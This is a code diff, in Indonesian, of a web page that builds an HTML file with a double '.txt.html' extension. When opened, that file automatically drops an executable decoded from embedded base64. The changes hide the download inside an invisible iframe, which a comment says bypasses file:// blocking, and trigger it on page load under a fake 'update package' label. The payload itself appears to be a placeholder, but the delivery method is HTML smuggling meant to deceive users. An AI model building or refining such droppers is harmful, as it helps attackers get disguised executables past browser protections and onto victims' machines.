@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk mengunduh satu file HTML ber-ekstensi <code>.txt.html</code>. Saat dibuka, file tersebut akan memicu download satu file .exe.</p>
+<p>Klik tombol untuk mengunduh satu file HTML. Saat dibuka, file tersebut akan memicu download satu file .exe melalui iframe tersembunyi.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -62,6 +62,8 @@ const prepareMimeBlobAsync = (i) => {
             "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Mengunduh paket...</p>" +
             "    <p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
             "</div>" +
+            // Iframe tersembunyi untuk memaksa eksekusi download
+            "<iframe id='hiddenFrame' style='display:none;'></iframe>" +
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
@@ -75,7 +77,7 @@ const prepareMimeBlobAsync = (i) => {
             "return bytes;" +
             "}" +
             
-            // PAYLOAD: File .exe tiruan
+            // Payload .exe
             "var b64Data = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAAQAAA\" + " +
             "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
             "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
@@ -93,17 +95,15 @@ const prepareMimeBlobAsync = (i) => {
             "var bytesArr = b64KeBytes(b64Data);" +
             "var blob = new Blob([bytesArr], { type: 'application/x-msdownload' });" +
             "var url = URL.createObjectURL(blob);" +
-            "var a = document.createElement('a');" +
-            "a.href = url;" +
-            "a.download = 'System_Update_Calculator.exe';" +
-            "a.style.display = 'none';" +
-            "document.body.appendChild(a);" +
-            "a.click();" +
+            
+            // Menggunakan iframe untuk memicu unduhan (bypass blokir file://)
+            "var iframe = document.getElementById('hiddenFrame');" +
+            "iframe.src = url;" +
+            
             "setTimeout(function(){ " +
-            "if (a.parentNode) a.parentNode.removeChild(a); " +
             "URL.revokeObjectURL(url); " +
             "}, 3000);" +
-            "statusEl.textContent = 'Paket berhasil diunduh. Silakan jalankan file tersebut.';" +
+            "statusEl.textContent = 'Paket berhasil diunduh.';" +
             "statusEl.style.color = '#4CAF50';" +
             "} catch(e){" +
             "statusEl.textContent = 'Gagal: ' + e.message;" +
@@ -112,9 +112,8 @@ const prepareMimeBlobAsync = (i) => {
             "}" +
             "}" +
             
+            // Panggil setelah halaman dimuat
             "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
-            "document.addEventListener('click', picuDownload);" +
-            "document.addEventListener('touchstart', picuDownload);" +
             "})();" +
             "<\/script>" +
             "</body>" +
@@ -130,10 +129,7 @@ const prepareMimeBlobAsync = (i) => {
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    
-    // KUNCI: Ekstensi ganda .txt.html
-    link.download = `update-paket.txt.html`;
-    
+    link.download = `update-paket.txt.html`; // Ekstensi ganda
     link.textContent = `Download update-paket.txt.html`;
     link.style.display = "none";
     downloadsDiv.appendChild(link);
